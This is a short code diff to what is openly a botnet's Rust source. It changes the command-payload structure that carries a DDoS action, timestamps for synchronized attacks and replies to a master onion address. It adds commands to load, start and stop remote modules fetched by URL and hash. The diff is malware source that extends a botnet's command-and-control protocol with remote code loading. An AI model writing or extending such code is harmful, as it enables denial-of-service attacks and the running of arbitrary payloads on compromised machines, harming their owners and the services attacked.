@@ -67,8 +67,11 @@ pub struct GhostPacket {
 #[derive(Serialize, Deserialize, Debug, Clone)]
 pub struct CommandPayload {
     pub id: String,         // UUIDv4
-    pub action: String,     // e.g. "DDOS_L4"
-    pub parameters: String, // e.g. "1.1.1.1|80|... "
+    pub action: String,     // "DDOS_L4", "LOAD_MODULE", "START_MODULE", "STOP_MODULE"
+    pub parameters: String, // Pipe-separated params
+                            // LOAD_MODULE:  "url|name|sha256"
+                            // START_MODULE: "name|args"
+                            // STOP_MODULE:  "name"
     pub execute_at: i64,    // Unix Timestamp for synchronized attack
     pub reply_to: Option<String>, // Optional: Master's Onion for Ack
 }
